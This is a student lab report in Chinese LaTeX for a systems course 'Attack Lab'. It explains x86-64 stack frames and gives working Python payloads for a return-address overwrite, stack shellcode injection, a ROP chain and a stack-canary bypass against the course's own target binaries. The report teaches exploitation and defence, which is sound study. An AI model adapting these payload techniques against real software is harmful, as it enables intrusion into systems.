@@ -1,0 +1,366 @@
+\documentclass[11pt,a4paper]{article}
+
+\usepackage{ctex}
+\usepackage[margin=2.4cm]{geometry}
+\usepackage{fontspec}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{booktabs}
+\usepackage{array}
+\usepackage{enumitem}
+\usepackage{amsmath}
+\usepackage{hyperref}
+\usepackage{titlesec}
+
+\setmainfont{Noto Serif CJK SC}
+\setsansfont{Noto Sans CJK SC}
+\setmonofont{Noto Sans Mono}[Scale=0.92]
+
+\hypersetup{colorlinks=true,linkcolor=blue!55!black,urlcolor=blue!55!black}
+
+\definecolor{codebg}{RGB}{248,248,248}
+\definecolor{codekw}{RGB}{23,84,156}
+\definecolor{codecmt}{RGB}{96,139,78}
+\definecolor{codestr}{RGB}{170,68,40}
+
+\lstset{
+  basicstyle=\ttfamily\footnotesize,
+  backgroundcolor=\color{codebg},
+  keywordstyle=\color{codekw}\bfseries,
+  commentstyle=\color{codecmt}\itshape,
+  stringstyle=\color{codestr},
+  breaklines=true,
+  showstringspaces=false,
+  frame=single,
+  framesep=4pt,
+  rulecolor=\color{gray!40},
+  columns=fullflexible,
+  keepspaces=true,
+  tabsize=4,
+  aboveskip=8pt,
+  belowskip=8pt,
+  literate={0x}{{0x}}2
+}
+
+\lstdefinelanguage{myasm}{
+  keywords={push,mov,sub,call,leave,ret,lea,test,je,jne,jmp,ja,pop,xor,add,cltq,movzbl,movzwl,repz,puts,printf,gets,strcpy,strlen,system,memmove,memcpy,exit,fflush},
+  sensitive=true,
+  comment=[l]{\#},
+  morestring=[b]"
+}
+
+\titleformat{\section}{\large\bfseries\sffamily}{\thesection}{0.6em}{}
+\titleformat{\subsection}{\normalsize\bfseries\sffamily}{\thesubsection}{0.6em}{}
+
+\setlength{\parskip}{4pt}
+\setlength{\parindent}{2em}
+
+\title{\sffamily\bfseries Lab 3：Attack Lab 实验报告}
+\author{\sffamily 李长川\\[2pt]\small 计算机系统基础（2026 年秋季学期）}
+\date{\sffamily\small 2026 年 11 月 27 日}
+
+\begin{document}
+\maketitle
+\thispagestyle{empty}
+
+\begin{abstract}\small
+\noindent 本报告围绕 \texttt{dark-calc}、\texttt{dark-calc-nx} 与 \texttt{dark-log} 三个目标程序展开。首先通过 GDB 观察 x86-64 调用栈上栈帧的建立与销毁过程，复现并解释基于栈的缓冲区溢出；随后依次完成四次利用：直接覆盖返回地址以执行 \texttt{malware}、在固定且可执行的栈上注入 shellcode、在栈不可执行且随机化的程序上实施 ROP，以及借助程序自身的 \texttt{memcpy} 绕过 Stack Protector（Canary）。所有 payload 均通过本地实测，输出与实验要求一致。
+\end{abstract}
+
+\section{观察栈帧 \texttt{input}}
+
+在 \texttt{attack/} 目录下执行 \texttt{gdb ./dark-calc}，对 \texttt{input} 下断点并运行。\texttt{input} 起始地址为 \texttt{0x401977}，其前半部分反汇编如下：
+
+\begin{lstlisting}[language=myasm]
+401977: 55               push   %rbp
+401978: 48 89 e5         mov    %rsp,%rbp
+40197b: 48 83 ec 10      sub    $0x10,%rsp
+...
+4019d5: c9               leave
+4019d6: c3               ret
+\end{lstlisting}
+
+\subsection{问题 1：\texttt{input} 由谁调用}
+
+查看 GEF 的 \texttt{trace}（回溯）部分，栈帧 \texttt{\#0} 为 \texttt{input}，其调用者 \texttt{\#1} 位于 \texttt{0x401ad1}，即 \texttt{main} 函数。因此 \texttt{input} 是由 \texttt{main} 调用的，对应 \texttt{main} 中 \texttt{401acc} 处的 \texttt{call 401977 <input>}。
+
+\subsection{问题 2：前三条指令的作用与 \$rbp 指向的值}
+
+前三条指令即函数的 \textbf{prologue（序言）}：
+
+\begin{enumerate}[leftmargin=2em]
+  \item \texttt{push \%rbp}：把调用者（\texttt{main}）的基址寄存器 \texttt{rbp} 压入栈中保存，栈指针 \texttt{rsp} 减 8；
+  \item \texttt{mov \%rsp,\%rbp}：令当前帧的 \texttt{rbp} 指向刚刚保存的旧 \texttt{rbp}，以此作为本栈帧的基准地址；
+  \item \texttt{sub \$0x10,\%rsp}：将 \texttt{rsp} 下移 16 字节，为局部变量（16 字节的 \texttt{expression} 数组）分配空间。
+\end{enumerate}
+
+断点处实测 \texttt{\$rbp = 0x721000800fe0}，该地址中存储的值为 \texttt{0x721000800ff0}。它正是被 \texttt{push \%rbp} 保存下来的、\textbf{调用者 \texttt{main} 的 \texttt{rbp}}，来自 \texttt{input} 被调用前 \texttt{main} 帧中的 \texttt{rbp} 寄存器。
+
+\subsection{问题 3：\$rbp+8 处的值}
+
+实测 \texttt{(\$rbp+8) = 0x0000000000401ad1}。查看 \texttt{main} 的反汇编：
+
+\begin{lstlisting}[language=myasm]
+401acc: e8 a6 fe ff ff   call   401977 <input>
+401ad1: b8 00 00 00 00   mov    $0x0,%eax
+401ad6: e8 fc fe ff ff   call   4019d7 <eval>
+\end{lstlisting}
+
+\texttt{0x401ad1} 正是 \texttt{call input} 之后、下一条指令 \texttt{mov \$0x0,\%eax} 的地址。因此 \texttt{\$rbp+8} 处存放的是 \texttt{input} 的\textbf{返回地址}，即函数执行完后应当回到 \texttt{main} 中的位置。
+
+\subsection{问题 4：是哪条指令在 \$rbp+8 处存入值}
+
+在 \texttt{main} 的 \texttt{call} 指令（\texttt{0x401acc}）之前下断点，重新运行并用 \texttt{si} 逐指令推进。\texttt{call} 执行前 \texttt{\$rsp = 0x721000800ff0}；执行 \texttt{call 401977} 后：
+
+\begin{lstlisting}
+rsp = 0x721000800fe8          # rsp 减 8
+(0x721000800fe8) = 0x401ad1   # 栈顶写入返回地址
+rip = 0x401977                # 跳转到 input 入口
+\end{lstlisting}
+
+可见，是 \texttt{main} 中的 \texttt{call 401977 <input>} 这一行指令把紧随其后的地址 \texttt{0x401ad1} 压入栈中。经过 \texttt{push \%rbp} 与 \texttt{mov \%rsp,\%rbp} 后，该槽位恰好位于新 \texttt{rbp} 的 \texttt{+8} 处。
+
+\subsection{问题 5：\texttt{call}、prologue、\texttt{leave}、\texttt{ret} 的作用}
+
+在 \texttt{input} 的 \texttt{leave} 之前下断点，逐指令执行回 \texttt{main}，观测到：
+
+\begin{lstlisting}
+# leave 前：rsp = 0x721000800fd0, rbp = 0x721000800fe0
+leave                      # = mov %rbp,%rsp ; pop %rbp
+# leave 后：rsp = 0x721000800fe8, rbp = 0x721000800ff0（恢复为 main 的 rbp）
+ret                        # = pop %rip
+# ret 后：  rsp = 0x721000800ff0, rip = 0x401ad1（回到 main）
+\end{lstlisting}
+
+综合问题 2–4，四类机制的作用可归纳如下：
+
+\begin{itemize}[leftmargin=2em]
+  \item \texttt{call}：把下一条指令的地址（返回地址）压栈，再跳转到被调用函数入口，完成控制流的转移并为将来返回留下落点；
+  \item prologue（\texttt{push rbp; mov rsp rbp; sub ... rsp}）：保存调用者的 \texttt{rbp}，建立当前帧的基准，并在低地址方向分配局部变量空间；
+  \item \texttt{leave}：等价于 \texttt{mov rbp,rsp}（回收局部变量空间，使 \texttt{rsp} 回到帧基址）再 \texttt{pop rbp}（恢复调用者的 \texttt{rbp}）；
+  \item \texttt{ret}：等价于 \texttt{pop rip}，从栈顶弹出返回地址送入 \texttt{rip}，控制流回到调用者 \texttt{call} 之后的位置。
+\end{itemize}
+
+\section{用不同长度的字符串测试 \texttt{dark-calc}}
+
+\texttt{input} 中 \texttt{expression} 仅 16 字节，而 \texttt{gets} 不做任何长度检查，持续向高地址写入。分别输入 20、32 个字符（连同终止 \texttt{\textbackslash 0} 实际写入 21、33 字节）：
+
+\begin{center}
+\renewcommand{\arraystretch}{1.25}
+\begin{tabular}{>{\ttfamily}l >{\ttfamily}l l}
+\toprule
+输入字符数 & 实际写入字节 & 程序表现 \\
+\midrule
+20 & 21 & 正常运行，输出计算结果后进入下一轮 \\
+32 & 33 & \texttt{Segmentation fault}，退出码 139 \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+在 \texttt{gets} 调用之后（\texttt{0x40199f}）下断点，输入 32 个 \texttt{A} 后观察栈帧：
+
+\begin{lstlisting}
+0x721000800fd0: 0x4141414141414141  0x4141414141414141   # expression（16 字节）
+0x721000800fe0: 0x4141414141414141                       # 保存的 rbp 被覆盖
+0x721000800fe8: 0x4141414141414141                       # 返回地址被覆盖
+\end{lstlisting}
+
+超量数据沿\textbf{高地址方向}依次覆盖：\texttt{expression} 本身（\texttt{rbp-0x10}）、保存的旧 \texttt{rbp}（\texttt{rbp}）、返回地址（\texttt{rbp+8}）。20 字符时仅覆盖到保存的 \texttt{rbp}，返回地址 \texttt{0x401ad1} 仍完好，故能正常返回；32 字符时返回地址被改写为非法的 \texttt{0x4141414141414141}，\texttt{ret} 跳转到该未映射地址，触发硬件内存保护，产生段错误。这正是\textbf{基于栈的缓冲区溢出（Stack-based Buffer Overflow）}。
+
+\section{任务一：利用缓冲区漏洞执行 \texttt{./malware}}
+
+\subsection{攻击思路}
+
+\texttt{input} 在 \texttt{gets} 之后会用 \texttt{strcpy} 把 \texttt{expression} 复制到全局缓冲区 \texttt{command\_buf}（\texttt{0x6030d0}）。而 \texttt{eval} 中存在如下指令：
+
+\begin{lstlisting}[language=myasm]
+401a6b: bf d0 30 60 00   mov    $0x6030d0,%edi   # rdi = command_buf
+401a70: e8 6b fd ff ff   call   4017e0 <system>  # system(command_buf)
+\end{lstlisting}
+
+正常流程中 \texttt{eval} 会先把 \texttt{echo ((...))} 拼接到 \texttt{command\_buf}；但只要把 \texttt{input} 的返回地址直接改写为 \texttt{0x401a6b}，就会跳过拼接逻辑，此时 \texttt{command\_buf} 中仍是我们输入的字符串，\texttt{system} 便会执行它。
+
+\subsection{Payload 构造}
+
+在 \texttt{payload.py} 中：前 16 字节放置命令 \texttt{./malware}（不足处以 \texttt{\textbackslash 0} 与填充补齐，\texttt{strcpy} 只复制到首个 \texttt{\textbackslash 0}）；接着 8 字节覆盖保存的 \texttt{rbp}；最后 8 字节把返回地址改写为 \texttt{0x401a6b}。
+
+\begin{lstlisting}[language=Python]
+payload = b"./malware\x00" + b"A"*6   # 16 字节：命令字符串
+payload += b"B"*8                     # 覆盖保存的 rbp
+payload += struct.pack("<Q", 0x401A6B)# 返回地址 -> system 调用点
+payload += b"\n"
+\end{lstlisting}
+
+这里特意把返回地址放在偏移 24 处，使 \texttt{gets} 的终止 \texttt{\textbackslash 0} 落在偏移 32，不会破坏返回地址；且整个 payload 不含 \texttt{0x0a}。运行 \texttt{python3 payload.py | ./dark-calc}，输出中出现：
+
+\begin{lstlisting}
+### The bomb was triggered by the dark-calc process. ###
+### You have successfully detonated the bomb! Congratulations! ###
+\end{lstlisting}
+
+攻击成功。（\texttt{system} 返回后程序因栈帧已被破坏而崩溃，但目标输出已经产生，不影响利用结果。）
+
+\section{用 GDB 检查 \texttt{main} 函数的机器码}
+
+\subsection{问题 1：前三行汇编对应的机器码}
+
+在 \texttt{main} 入口 \texttt{0x401ac3} 下断点，用 \texttt{x/12bx 0x401ac3} 检查内存。前三行指令及其机器码为：
+
+\begin{center}
+\renewcommand{\arraystretch}{1.25}
+\begin{tabular}{l l >{\ttfamily}l l}
+\toprule
+地址 & 汇编 & 机器码 & 长度 \\
+\midrule
+0x401ac3 & \texttt{push \%rbp} & 55 & 1 字节 \\
+0x401ac4 & \texttt{mov \%rsp,\%rbp} & 48 89 e5 & 3 字节 \\
+0x401ac7 & \texttt{mov \$0x0,\%eax} & b8 00 00 00 00 & 5 字节 \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\subsection{问题 2：机器码在内存中的排列方式}
+
+内存从 \texttt{0x401ac3} 开始的字节依次为：
+
+\begin{lstlisting}
+0x401ac3: 55  48 89 e5  b8 00 00 00 00  e8 a6 fe ff ff ...
+          |  |--------|  |-------------|  |-------------|
+          push rbp      mov rsp,rbp      mov eax,0       call ...
+          [ac3]         [ac4..ac6]       [ac7..acb]      [acc..]
+\end{lstlisting}
+
+指令在内存中\textbf{紧密排列、长度可变}，每条指令占据一段连续区间，下一条指令紧接其后。单步执行时 \texttt{rip} 依次为 \texttt{0x401ac3 $\to$ 0x401ac4 $\to$ 0x401ac7 $\to$ 0x401acc}，每次增加的字节数恰好等于当前指令的长度，CPU 依 \texttt{rip} 顺序取指。
+
+多字节数据采用\textbf{小端序（Little Endian）}：最低有效字节存放在最低地址。例如 \texttt{eval} 中 \texttt{mov \$0x6030d0,\%edi} 的机器码为 \texttt{bf d0 30 60 00}，立即数 \texttt{0x006030d0} 在内存中按 \texttt{d0 30 60 00} 的顺序存放，数值最低字节 \texttt{d0} 位于最前。\texttt{main} 第三行的立即数 0 同理为 \texttt{00 00 00 00}。
+
+\section{任务二：栈空间执行}
+
+\subsection{固定且可执行的栈}
+
+\texttt{dark-calc} 的构造函数 \texttt{init\_fixed\_stack}（\texttt{0x401add}）通过 \texttt{mmap} 在\textbf{固定地址} \texttt{0x721000000000} 映射一块 \texttt{RWX} 内存（保护属性为 \texttt{PROT\_READ|PROT\_WRITE|PROT\_EXEC}），并在两侧用 \texttt{mprotect} 建立不可访问的 guard page；\texttt{\_\_wrap\_main} 再把 \texttt{rsp} 设置为固定的 \texttt{fixed\_stack\_top}。实测内存映射中 \texttt{0x721000001000--0x721000801000} 为 \texttt{rwxp}，故栈地址固定\textbf{且可执行}，\texttt{expression} 缓冲区恒定位于 \texttt{0x721000800fd0}。
+
+\subsection{Shellcode 与 Payload}
+
+目标是调用未使用的 \texttt{grade\_eval}（\texttt{0x401a87}）。按 x86-64 调用约定，整型参数经 \texttt{rdi} 传递，故先令 \texttt{edi=4}，再把函数地址送入 \texttt{rax} 并调用：
+
+\begin{lstlisting}[language=myasm]
+bf 04 00 00 00       mov    $0x4,%edi        # 参数 grade = 4
+b8 87 1a 40 00       mov    $0x401a87,%eax   # grade_eval 地址
+ff d0                call   *%rax            # grade_eval(4)
+\end{lstlisting}
+
+该 shellcode 仅 12 字节，可放入 16 字节缓冲区。\texttt{payload\_dark.py} 用机器码填满缓冲区，再把返回地址覆盖为缓冲区自身地址：
+
+\begin{lstlisting}[language=Python]
+shellcode = b"\xbf\x04\x00\x00\x00"
+shellcode += b"\xb8" + struct.pack("<I", 0x401A87)
+shellcode += b"\xff\xd0"                       # 共 12 字节
+payload  = shellcode + b"\x90"*(16-len(shellcode))
+payload += b"B"*8
+payload += struct.pack("<Q", 0x721000800FD0)   # 返回到缓冲区
+payload += b"\n"
+\end{lstlisting}
+
+\texttt{input} 的 \texttt{ret} 将控制流送入栈上 shellcode，最终输出红色的 \texttt{Hope A will be your grade!}。此时 \texttt{rsp = 0x721000800ff0}，16 字节对齐，shellcode 内 \texttt{call} 进入 \texttt{grade\_eval} 时满足 ABI 对齐要求。
+
+\section{任务三：ROP}
+
+\texttt{dark-calc-nx} 的栈不可执行且经 ASLR 随机化，但它是 non-PIE，\texttt{.text} 段地址固定且可执行。因此改用\textbf{返回导向编程（ROP）}，只在固定代码段中寻找以 \texttt{ret} 结尾的 gadget。
+
+\subsection{Gadget 挖掘}
+
+提示范围 \texttt{0x4019d0--0x401ae3} 对应 \texttt{\_\_libc\_csu\_init}，其末尾为：
+
+\begin{lstlisting}[language=myasm]
+401a32: 41 5f   pop %r15
+401a34: c3      ret
+\end{lstlisting}
+
+从 \texttt{401a32} 中间的 \texttt{401a33} 开始取字节，\texttt{5f} 恰为 \texttt{pop \%rdi}，紧随的 \texttt{c3} 为 \texttt{ret}，于是得到隐藏 gadget：
+
+\begin{itemize}[leftmargin=2em]
+  \item \texttt{0x401a33：pop rdi ; ret}——可把栈上数据装入参数寄存器 \texttt{rdi}；
+  \item \texttt{0x401a34：ret}——纯返回，用于栈对齐填充。
+\end{itemize}
+
+\subsection{ROP 链与对齐处理}
+
+\texttt{grade\_eval} 位于 \texttt{0x401978}。最初构造的链为 \texttt{pop rdi; 4; grade\_eval}，却崩溃在 glibc 的 \texttt{movaps}（要求 16 字节对齐）处。实测该情况下进入 \texttt{grade\_eval} 时 \texttt{rsp \% 16 == 0}，而 ABI 要求函数入口 \texttt{rsp \% 16 == 8}（即正常 \texttt{call} 压入返回地址后的状态）。在链首增加一个 \texttt{ret} gadget 多消耗一个 8 字节槽位后，入口对齐翻转正确。最终链如下：
+
+\begin{lstlisting}[language=Python]
+chain  = struct.pack("<Q", 0x401A34)  # ret：对齐填充
+chain += struct.pack("<Q", 0x401A33)  # pop rdi ; ret
+chain += struct.pack("<Q", 4)         # rdi = 4
+chain += struct.pack("<Q", 0x401978)  # grade_eval
+payload = b"A"*16 + b"B"*8 + chain + b"\n"
+\end{lstlisting}
+
+执行过程：\texttt{input} 的 \texttt{ret}（此时 \texttt{rsp} 16 字节对齐）先进入填充 \texttt{ret}，再经 \texttt{pop rdi} 将 4 装入 \texttt{rdi}，最后 \texttt{ret} 进入 \texttt{grade\_eval}，入口 \texttt{rsp \% 16 == 8}，\texttt{printf} 正常执行，输出 \texttt{Hope A will be your grade!}。多次运行结果稳定，不依赖随机化的栈地址。
+
+\section{任务四：Canary 绕过}
+
+\texttt{dark-log} 在编译时开启了 Stack Protector：函数入口从 \texttt{fs:0x28} 取出随机 canary 存于 \texttt{rbp-0x8}，返回前校验，一旦被改即调用 \texttt{\_\_stack\_chk\_fail} 终止。直接经 \texttt{gets} 覆盖返回地址必然先破坏 canary，故需借助函数自身逻辑曲线绕过。
+
+\subsection{栈布局}
+
+\texttt{input} 帧大小 \texttt{0x120}，结构体 \texttt{log\_frame} 各字段相对 \texttt{expression}（\texttt{rbp-0x120}）的偏移为：
+
+\begin{lstlisting}
+0x000  expression[128]   (rbp-0x120)
+0x080  logMsg[128]       (rbp-0xa0)
+0x100  len (int)         (rbp-0x20)
+0x104  pad[8] 与空隙
+0x118  canary            (rbp-0x8)
+0x120  saved rbp         (rbp)
+0x128  return address    (rbp+8)
+\end{lstlisting}
+
+函数在 \texttt{gets} 之后执行 \texttt{memcpy(logMsg + len, expression, 128)}，其中 \texttt{len} 初始为 0，但它位于 \texttt{expression} 高地址方向、\texttt{canary} 之前，可被 \texttt{gets} 溢出改写而不触碰 canary。
+
+\subsection{两阶段绕过}
+
+\textbf{第一阶段：}输入数据越过 \texttt{expression}、\texttt{logMsg}，在偏移 \texttt{0x100} 处把 \texttt{len} 改写为 \texttt{0xa0}，随即用换行结束。canary（偏移 \texttt{0x118}）完全未被写入，保持有效。
+
+\textbf{第二阶段：}程序执行 \texttt{memcpy}，目标地址为 \texttt{logMsg + 0xa0 = (rbp-0xa0)+0xa0 = rbp}，即保存的 \texttt{rbp} 槽位。于是 \texttt{expression} 的前 128 字节被复制到 \texttt{canary} \textbf{之上}的区域，直接覆盖保存的 \texttt{rbp} 与返回地址，而 canary 全程不变，校验通过。
+
+\texttt{dark-log} 中同样存在 csu 隐藏 gadget：\texttt{0x4018a3} 为 \texttt{pop rdi; ret}，\texttt{0x4018a4} 为 \texttt{ret}，\texttt{grade\_eval} 位于 \texttt{0x401677}。在 \texttt{expression} 开头布置好 ROP 链（经 \texttt{memcpy} 落到 \texttt{rbp} 处）：
+
+\begin{lstlisting}[language=Python]
+buf  = b"A"*8
+buf += struct.pack("<Q", 0x4018A4)  # ret 对齐
+buf += struct.pack("<Q", 0x4018A3)  # pop rdi ; ret
+buf += struct.pack("<Q", 4)         # rdi = 4
+buf += struct.pack("<Q", 0x401677)  # grade_eval
+buf += b"C"*(128-len(buf))
+payload  = buf + b"D"*128
+payload += struct.pack("<I", 0xA0)  # 覆盖 len
+payload += b"\n"
+\end{lstlisting}
+
+\texttt{input} 返回后沿该链调用 \texttt{grade\_eval(4)}，入口 \texttt{rsp \% 16 == 8}，成功输出 \texttt{Hope A will be your grade!}，且 canary 校验未触发。
+
+\subsection{如何重排局部变量使攻击失效}
+
+本次利用成立的关键，是\textbf{控制变量 \texttt{len} 位于可溢出缓冲区 \texttt{expression} 的高地址方向，且处于 canary 之前}，使攻击者能在不破坏 canary 的情况下篡改 \texttt{len}，再借 \texttt{memcpy} 实现任意方向写。
+
+要使其失效，应调整栈上变量的排布，让\textbf{两个 char 数组（\texttt{expression}、\texttt{logMsg}）占据最靠近 canary 的高地址位置，而把 \texttt{len} 等控制变量放到数组的低地址方向}。这样 \texttt{gets} 从 \texttt{expression} 向高地址溢出时，首先遇到的是另一个数组，再往上就是 canary——攻击者无法在不覆盖 canary 的前提下触及 \texttt{len}，也就不能控制 \texttt{memcpy} 的目标偏移；而 \texttt{len} 处于低地址方向，栈只向低地址生长、\texttt{gets} 只向高地址写，溢出数据根本无法到达它。现代编译器的 Stack Protector 正是采用类似策略，对栈上局部变量重新排布，使缓冲区尽量靠近 canary，避免在缓冲区与 canary 之间留下可被利用的控制变量。
+
+\section{附加观察：ASLR}
+
+在 \texttt{src} 下 \texttt{cc -o aslr aslr.c} 后反复运行，局部变量地址每次均不同（如 \texttt{0x7ffddbf45c14}、\texttt{0x7ffdd000f3784}、\texttt{0x7ffd49e65d04}），体现 ASLR 对栈布局的随机化；而在 GDB 中运行时两次都得到 \texttt{0x7fffffff68e4}，因为 GDB 为便于调试默认禁用 ASLR。这也解释了为何 ROP 与 Canary 任务只使用 non-PIE 中固定的 \texttt{.text} 地址，而不依赖随机化的栈地址。
+
+\section{总结}
+
+本实验从调用栈的结构出发，完整呈现了缓冲区溢出的原理与攻防演进：
+
+\begin{enumerate}[leftmargin=2em]
+  \item 直接覆盖返回地址，劫持控制流执行 \texttt{malware}；
+  \item 利用固定、可执行的栈注入自定义 shellcode；
+  \item 栈不可执行后，用固定代码段中的 gadget 实施 ROP，并处理 16 字节栈对齐；
+  \item 面对 Canary，通过溢出改写 \texttt{len}、借 \texttt{memcpy} 跳过 canary 覆盖返回地址。
+\end{enumerate}
+
+四个 payload 均在本地实测通过，输出与实验要求完全一致。实验表明，系统安全依赖于内存权限、地址随机化、栈保护等\textbf{多层独立机制}的协同；而每一种防护出现后，又会催生新的攻击手段，这正是一场持续演进的“猫鼠游戏”。
+
+\end{document}
